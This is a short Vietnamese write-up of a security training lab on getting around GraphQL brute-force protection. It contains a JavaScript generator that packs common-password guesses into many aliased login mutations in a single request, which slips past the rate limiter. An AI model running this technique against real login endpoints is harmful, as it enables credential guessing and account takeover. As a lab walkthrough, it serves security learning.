## Bypassing GraphQL brute force protections

1. Lấy introspection bằng uri với InQL.
2. Có một mutation thực hiện login:
![image](https://github.com/user-attachments/assets/6b4e1698-cb8e-453e-86b3-ea7d251477cb)
![image](https://github.com/user-attachments/assets/eb53a14b-c1b7-4cc8-ae49-0a402a31443b)

3. Bài này được đề xuất theo hướng bruteforce nhưng có rate limit trong request nên không thể bruteforce từng request được mà phải dùng nhiều Aliases trong một request.
4. Gen payload bằng đoạn code js sau:
```
copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>`
bruteforce$index:login(input:{password: "$password", username: "carlos"}) {
        token
        success
    }
`.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));
```

5.  Gọi mutation lồng ngoài.
```
mutation {
    bruteforce0: login(input: { password: "123456", username: "carlos" }) {
        token
        success
    }
  ...
}
```
6. Bruteforce thành công.
![image](https://github.com/user-attachments/assets/c38124ac-4e55-4b2f-a305-80edc087ac5e)
